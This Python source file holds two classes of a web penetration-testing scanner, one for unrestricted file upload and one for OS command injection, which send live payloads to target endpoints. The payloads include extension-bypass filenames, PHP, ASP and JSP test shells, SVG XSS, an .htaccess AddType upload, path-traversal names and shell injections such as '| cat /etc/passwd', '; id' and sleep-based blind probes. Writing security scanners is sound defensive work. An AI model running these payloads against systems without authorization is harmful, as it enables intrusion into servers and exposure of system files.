"""
Jarwis AGI Pen Test - File Upload Scanner
Detects file upload vulnerabilities (A03:2021 - Injection, A04:2021 - Insecure Design)
Based on Web Hacking 101 techniques - adapted for 2025
"""

import asyncio
import logging
import io
import random
import string
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin
import aiohttp
import ssl

logger = logging.getLogger(__name__)


@dataclass
class ScanResult:
    id: str
    category: str
    severity: str
    title: str
    description: str
    url: str
    method: str
    parameter: str = ""
    evidence: str = ""
    remediation: str = ""
    cwe_id: str = ""
    poc: str = ""
    reasoning: str = ""
    request_data: str = ""
    response_data: str = ""


class FileUploadScanner:
    """
    Scans for Unrestricted File Upload vulnerabilities
    OWASP A04:2021 - Insecure Design
    
    Attack vectors:
    - Extension bypass (double extension, null byte)
    - MIME type bypass
    - Content-Type confusion
    - Magic bytes bypass
    - Path traversal in filename
    - Polyglot files
    - SVG XSS
    - .htaccess upload
    """
    
    # File extensions to test
    DANGEROUS_EXTENSIONS = [
        '.php', '.php3', '.php4', '.php5', '.phtml', '.phar',
        '.asp', '.aspx', '.ashx', '.asa', '.asmx',
        '.jsp', '.jspx', '.jsw', '.jsv', '.jspf',
        '.exe', '.bat', '.cmd', '.sh', '.py', '.pl', '.rb',
        '.htaccess', '.htpasswd', '.config', '.ini',
        '.svg', '.html', '.htm', '.shtml', '.xml',
    ]
    
    # Extension bypass techniques
    EXTENSION_BYPASSES = [
        # Double extensions
        '.php.jpg', '.php.png', '.php.gif', '.asp.jpg',
        # Null byte (legacy)
        '.php%00.jpg', '.php\x00.jpg',
        # Case variations
        '.PhP', '.pHp', '.PHP', '.pHP',
        # Alternative PHP extensions
        '.php7', '.php8', '.phps', '.pht',
        # Space/dots
        '.php.', '.php ', '.php....', '. php',
        # Windows special
        '.php::$DATA', '.php:$DATA',
        # Uncommon
        '.module', '.inc', '.cgi',
    ]
    
    # Shell content for testing
    SHELL_CONTENTS = {
        'php': '<?php echo "jarwis_upload_test"; ?>',
        'asp': '<%Response.Write("jarwis_upload_test")%>',
        'jsp': '<%out.print("jarwis_upload_test");%>',
        'svg': '''<svg xmlns="http://www.w3.org/2000/svg">
            <script>alert("jarwis_upload_test")</script>
        </svg>''',
        'html': '<script>alert("jarwis_upload_test")</script>',
        'htaccess': 'AddType application/x-httpd-php .jpg',
    }
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 30)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting File Upload scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        # Common upload endpoints
        upload_endpoints = [
            '/upload', '/api/upload', '/api/files', '/api/images',
            '/file/upload', '/files/upload', '/image/upload',
            '/api/v1/upload', '/api/v1/files', '/upload.php',
            '/admin/upload', '/user/upload', '/profile/upload',
            '/api/avatar', '/avatar/upload', '/media/upload',
        ]
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            # Test common endpoints
            for endpoint in upload_endpoints:
                url = urljoin(base_url, endpoint)
                await self._test_upload_endpoint(session, url)
            
            # Test discovered endpoints
            if hasattr(self.context, 'endpoints'):
                for endpoint in self.context.endpoints[:30]:
                    ep_url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                    if ep_url and any(kw in ep_url.lower() for kw in ['upload', 'file', 'image', 'media', 'avatar']):
                        await self._test_upload_endpoint(session, ep_url)
        
        logger.info(f"File upload scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _test_upload_endpoint(self, session: aiohttp.ClientSession, url: str):
        """Test upload endpoint for vulnerabilities"""
        
        # First, check if endpoint accepts uploads
        accepts_upload = await self._probe_upload(session, url)
        if not accepts_upload:
            return
        
        # Test extension bypass
        await self._test_extension_bypass(session, url)
        
        # Test MIME type bypass
        await self._test_mime_bypass(session, url)
        
        # Test path traversal in filename
        await self._test_path_traversal(session, url)
        
        # Test SVG XSS
        await self._test_svg_xss(session, url)
        
        # Test .htaccess upload
        await self._test_htaccess(session, url)
    
    async def _probe_upload(self, session: aiohttp.ClientSession, url: str) -> bool:
        """Check if endpoint accepts file uploads"""
        try:
            # Create a simple text file
            form_data = aiohttp.FormData()
            form_data.add_field(
                'file',
                b'test content',
                filename='test.txt',
                content_type='text/plain'
            )
            
            # Also try common field names
            for field_name in ['file', 'upload', 'image', 'avatar', 'document']:
                form_data = aiohttp.FormData()
                form_data.add_field(
                    field_name,
                    b'test content',
                    filename='test.txt',
                    content_type='text/plain'
                )
                
                await asyncio.sleep(1 / self.rate_limit)
                
                async with session.post(url, data=form_data) as response:
                    if response.status in [200, 201]:
                        return True
                    body = await response.text()
                    # Check for upload-related responses
                    if any(kw in body.lower() for kw in ['uploaded', 'success', 'file', 'saved']):
                        return True
                        
        except Exception as e:
            logger.debug(f"Upload probe error: {e}")
        
        return False
    
    async def _test_extension_bypass(self, session: aiohttp.ClientSession, url: str):
        """Test extension bypass techniques"""
        random_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        
        for bypass in self.EXTENSION_BYPASSES:
            try:
                await asyncio.sleep(1 / self.rate_limit)
                
                filename = f"{random_name}{bypass}"
                content = self.SHELL_CONTENTS['php'].encode()
                
                # Add GIF magic bytes
                content = b'GIF89a\n' + content
                
                form_data = aiohttp.FormData()
                form_data.add_field(
                    'file',
                    content,
                    filename=filename,
                    content_type='image/gif'
                )
                
                async with session.post(url, data=form_data) as response:
                    body = await response.text()
                    
                    if response.status in [200, 201]:
                        # Check if file was uploaded
                        if 'url' in body.lower() or 'path' in body.lower() or 'success' in body.lower():
                            result = ScanResult(
                                id=f"UPLOAD-EXT-{len(self.results)+1}",
                                category="A04:2021 - Insecure Design",
                                severity="critical",
                                title=f"File Upload Extension Bypass: {bypass}",
                                description=f"Server accepts dangerous extension via bypass: {bypass}",
                                url=url,
                                method="POST",
                                parameter="file",
                                evidence=f"Extension bypass successful: {filename}",
                                remediation="Whitelist allowed extensions. Validate on server side.",
                                cwe_id="CWE-434",
                                poc=f"Upload file with name: {filename}",
                                reasoning=f"Dangerous extension {bypass} was accepted"
                            )
                            self.results.append(result)
                            return
                            
            except Exception as e:
                logger.debug(f"Extension bypass test error: {e}")
    
    async def _test_mime_bypass(self, session: aiohttp.ClientSession, url: str):
        """Test MIME type bypass"""
        random_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        
        # Send PHP content with image MIME type
        mime_tests = [
            ('image/jpeg', '.php'),
            ('image/png', '.php'),
            ('image/gif', '.phtml'),
            ('application/octet-stream', '.php'),
        ]
        
        for mime_type, ext in mime_tests:
            try:
                await asyncio.sleep(1 / self.rate_limit)
                
                filename = f"{random_name}{ext}"
                content = self.SHELL_CONTENTS['php'].encode()
                
                form_data = aiohttp.FormData()
                form_data.add_field(
                    'file',
                    content,
                    filename=filename,
                    content_type=mime_type
                )
                
                async with session.post(url, data=form_data) as response:
                    body = await response.text()
                    
                    if response.status in [200, 201] and 'error' not in body.lower():
                        if 'success' in body.lower() or 'url' in body.lower():
                            result = ScanResult(
                                id=f"UPLOAD-MIME-{len(self.results)+1}",
                                category="A04:2021 - Insecure Design",
                                severity="critical",
                                title="File Upload MIME Type Bypass",
                                description=f"Server accepts dangerous files with {mime_type} MIME type.",
                                url=url,
                                method="POST",
                                parameter="Content-Type",
                                evidence=f"Uploaded {ext} file with MIME: {mime_type}",
                                remediation="Validate file content, not just MIME type.",
                                cwe_id="CWE-434",
                                poc=f"Upload {filename} with Content-Type: {mime_type}",
                                reasoning="Content-Type validation can be bypassed"
                            )
                            self.results.append(result)
                            return
                            
            except Exception as e:
                logger.debug(f"MIME bypass test error: {e}")
    
    async def _test_path_traversal(self, session: aiohttp.ClientSession, url: str):
        """Test path traversal in filename"""
        
        traversal_names = [
            '../../../test.txt',
            '..\\..\\..\\test.txt',
            '....//....//test.txt',
            '..%2f..%2f..%2ftest.txt',
            '..%5c..%5c..%5ctest.txt',
        ]
        
        for filename in traversal_names:
            try:
                await asyncio.sleep(1 / self.rate_limit)
                
                form_data = aiohttp.FormData()
                form_data.add_field(
                    'file',
                    b'jarwis_traversal_test',
                    filename=filename,
                    content_type='text/plain'
                )
                
                async with session.post(url, data=form_data) as response:
                    body = await response.text()
                    
                    if response.status in [200, 201]:
                        # Check if traversal was successful
                        if '..' not in body or 'success' in body.lower():
                            result = ScanResult(
                                id=f"UPLOAD-TRAVERSAL-{len(self.results)+1}",
                                category="A01:2021 - Broken Access Control",
                                severity="high",
                                title="Path Traversal in File Upload",
                                description="Filename path traversal may allow writing to arbitrary locations.",
                                url=url,
                                method="POST",
                                parameter="filename",
                                evidence=f"Accepted filename: {filename}",
                                remediation="Sanitize filenames. Use random names with whitelisted extensions.",
                                cwe_id="CWE-22",
                                poc=f"Upload with filename: {filename}",
                                reasoning="Path traversal characters in filename accepted"
                            )
                            self.results.append(result)
                            return
                            
            except Exception as e:
                logger.debug(f"Path traversal test error: {e}")
    
    async def _test_svg_xss(self, session: aiohttp.ClientSession, url: str):
        """Test SVG XSS upload"""
        try:
            await asyncio.sleep(1 / self.rate_limit)
            
            svg_content = self.SHELL_CONTENTS['svg'].encode()
            random_name = ''.join(random.choices(string.ascii_lowercase, k=8))
            
            form_data = aiohttp.FormData()
            form_data.add_field(
                'file',
                svg_content,
                filename=f'{random_name}.svg',
                content_type='image/svg+xml'
            )
            
            async with session.post(url, data=form_data) as response:
                body = await response.text()
                
                if response.status in [200, 201] and 'error' not in body.lower():
                    result = ScanResult(
                        id=f"UPLOAD-SVG-{len(self.results)+1}",
                        category="A03:2021 - Injection",
                        severity="medium",
                        title="SVG File with XSS Payload Accepted",
                        description="Server accepts SVG files containing JavaScript.",
                        url=url,
                        method="POST",
                        parameter="file",
                        evidence="SVG with script tag uploaded successfully",
                        remediation="Sanitize SVG content. Remove script tags. Serve with correct headers.",
                        cwe_id="CWE-79",
                        poc="Upload SVG with embedded script tag",
                        reasoning="SVG files can execute JavaScript when viewed"
                    )
                    self.results.append(result)
                    
        except Exception as e:
            logger.debug(f"SVG XSS test error: {e}")
    
    async def _test_htaccess(self, session: aiohttp.ClientSession, url: str):
        """Test .htaccess upload for Apache servers"""
        try:
            await asyncio.sleep(1 / self.rate_limit)
            
            htaccess_content = self.SHELL_CONTENTS['htaccess'].encode()
            
            form_data = aiohttp.FormData()
            form_data.add_field(
                'file',
                htaccess_content,
                filename='.htaccess',
                content_type='text/plain'
            )
            
            async with session.post(url, data=form_data) as response:
                body = await response.text()
                
                if response.status in [200, 201] and 'error' not in body.lower():
                    result = ScanResult(
                        id=f"UPLOAD-HTACCESS-{len(self.results)+1}",
                        category="A05:2021 - Security Misconfiguration",
                        severity="critical",
                        title=".htaccess File Upload Allowed",
                        description=".htaccess upload can enable PHP execution in upload directory.",
                        url=url,
                        method="POST",
                        parameter="file",
                        evidence=".htaccess file was uploaded",
                        remediation="Block .htaccess uploads. Use AllowOverride None.",
                        cwe_id="CWE-434",
                        poc="Upload .htaccess with AddType directive",
                        reasoning=".htaccess can change Apache configuration"
                    )
                    self.results.append(result)
                    
        except Exception as e:
            logger.debug(f".htaccess test error: {e}")


class CommandInjectionScanner:
    """
    Scans for OS Command Injection vulnerabilities
    OWASP A03:2021 - Injection
    
    Tests various injection vectors:
    - Shell metacharacters
    - Blind command injection (time-based)
    - Out-of-band detection
    - Filename-based injection
    """
    
    # Command injection payloads
    CMD_PAYLOADS = {
        'unix': [
            '; id',
            '| id',
            '`id`',
            '$(id)',
            '; whoami',
            '| cat /etc/passwd',
            '&& id',
            '|| id',
            '\n id',
            '\r\n id',
            '; echo jarwis_cmd_test',
            '| echo jarwis_cmd_test',
        ],
        'windows': [
            '& whoami',
            '| type c:\\windows\\win.ini',
            '&& echo jarwis_cmd_test',
            '| echo jarwis_cmd_test',
            '\n echo jarwis_cmd_test',
        ],
        'blind_time': [
            '; sleep 5',
            '| sleep 5',
            '`sleep 5`',
            '$(sleep 5)',
            '& timeout /t 5',
            '| ping -n 5 127.0.0.1',
        ],
    }
    
    # Common parameters vulnerable to command injection
    VULN_PARAMS = [
        'cmd', 'exec', 'command', 'execute', 'ping', 'query', 'jump',
        'code', 'reg', 'do', 'func', 'arg', 'option', 'load', 'process',
        'step', 'read', 'feature', 'input', 'output', 'run', 'print',
        'hostname', 'host', 'ip', 'domain', 'file', 'filename', 'path',
        'daemon', 'upload', 'dir', 'download', 'log', 'email', 'to',
    ]
    
    # Detection patterns
    DETECTION_PATTERNS = [
        'uid=', 'gid=', 'groups=',  # Unix id command
        'root:', 'nobody:',  # /etc/passwd
        'jarwis_cmd_test',  # Our canary
        'Windows NT', 'WINDOWS',  # Windows info
        'desktop.ini',  # Windows files
    ]
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 10)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting Command Injection scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            # Test discovered endpoints
            if hasattr(self.context, 'endpoints'):
                for endpoint in self.context.endpoints[:30]:
                    ep_url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                    if ep_url:
                        await self._test_cmd_injection(session, ep_url)
            
            # Test common vulnerable endpoints
            vuln_endpoints = [
                '/ping', '/ping.php', '/tools/ping',
                '/exec', '/execute', '/shell',
                '/api/ping', '/api/test', '/api/tools',
                '/network/ping', '/diagnostics',
            ]
            
            for endpoint in vuln_endpoints:
                url = urljoin(base_url, endpoint)
                await self._test_cmd_injection(session, url)
        
        logger.info(f"Command injection scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _test_cmd_injection(self, session: aiohttp.ClientSession, url: str):
        """Test for command injection"""
        
        # Test GET parameters
        for param in self.VULN_PARAMS[:15]:  # Limit to avoid too many requests
            for payload in self.CMD_PAYLOADS['unix'][:5]:
                await self._send_injection(session, url, param, payload, 'GET')
        
        # Test POST parameters
        for param in self.VULN_PARAMS[:10]:
            for payload in self.CMD_PAYLOADS['unix'][:3]:
                await self._send_injection(session, url, param, payload, 'POST')
        
        # Test blind time-based
        await self._test_blind_injection(session, url)
    
    async def _send_injection(self, session: aiohttp.ClientSession, url: str, 
                             param: str, payload: str, method: str):
        """Send injection payload"""
        try:
            await asyncio.sleep(1 / self.rate_limit)
            
            if method == 'GET':
                separator = '&' if '?' in url else '?'
                test_url = f"{url}{separator}{param}={payload}"
                
                async with session.get(test_url) as response:
                    body = await response.text()
                    
                    if any(p in body for p in self.DETECTION_PATTERNS):
                        result = ScanResult(
                            id=f"CMDI-{len(self.results)+1}",
                            category="A03:2021 - Injection",
                            severity="critical",
                            title="OS Command Injection",
                            description=f"Parameter '{param}' is vulnerable to command injection.",
                            url=test_url,
                            method="GET",
                            parameter=param,
                            evidence=f"Command output detected in response",
                            remediation="Never pass user input to shell commands. Use parameterized APIs.",
                            cwe_id="CWE-78",
                            poc=payload,
                            reasoning="Shell command executed successfully"
                        )
                        self.results.append(result)
                        return
                        
            else:  # POST
                headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                data = {param: payload}
                
                async with session.post(url, data=data, headers=headers) as response:
                    body = await response.text()
                    
                    if any(p in body for p in self.DETECTION_PATTERNS):
                        result = ScanResult(
                            id=f"CMDI-{len(self.results)+1}",
                            category="A03:2021 - Injection",
                            severity="critical",
                            title="OS Command Injection via POST",
                            description=f"POST parameter '{param}' vulnerable to command injection.",
                            url=url,
                            method="POST",
                            parameter=param,
                            evidence="Command output detected",
                            remediation="Never pass user input to shell commands.",
                            cwe_id="CWE-78",
                            poc=payload,
                            reasoning="Shell command executed via POST"
                        )
                        self.results.append(result)
                        return
                        
        except Exception as e:
            logger.debug(f"Command injection test error: {e}")
    
    async def _test_blind_injection(self, session: aiohttp.ClientSession, url: str):
        """Test for blind command injection using time delays"""
        
        for payload in self.CMD_PAYLOADS['blind_time']:
            try:
                start_time = asyncio.get_event_loop().time()
                
                # Use longer timeout for blind testing
                timeout = aiohttp.ClientTimeout(total=15)
                
                separator = '&' if '?' in url else '?'
                test_url = f"{url}{separator}host={payload}"
                
                async with session.get(test_url, timeout=timeout) as response:
                    elapsed = asyncio.get_event_loop().time() - start_time
                    
                    # If response took significantly longer, might be blind injection
                    if elapsed > 4:
                        result = ScanResult(
                            id=f"CMDI-BLIND-{len(self.results)+1}",
                            category="A03:2021 - Injection",
                            severity="critical",
                            title="Blind Command Injection (Time-based)",
                            description="Time-based blind command injection detected.",
                            url=test_url,
                            method="GET",
                            parameter="host",
                            evidence=f"Response delayed by {elapsed:.2f} seconds",
                            remediation="Never pass user input to shell commands.",
                            cwe_id="CWE-78",
                            poc=payload,
                            reasoning=f"Sleep command caused {elapsed:.2f}s delay"
                        )
                        self.results.append(result)
                        return
                        
            except asyncio.TimeoutError:
                # Timeout could indicate successful injection
                result = ScanResult(
                    id=f"CMDI-BLIND-{len(self.results)+1}",
                    category="A03:2021 - Injection",
                    severity="high",
                    title="Potential Blind Command Injection",
                    description="Request timeout may indicate command execution.",
                    url=url,
                    method="GET",
                    parameter="host",
                    evidence="Request timed out after sleep payload",
                    remediation="Never pass user input to shell commands.",
                    cwe_id="CWE-78",
                    poc=payload,
                    reasoning="Timeout suggests command execution"
                )
                self.results.append(result)
                return
                
            except Exception as e:
                logger.debug(f"Blind injection test error: {e}")
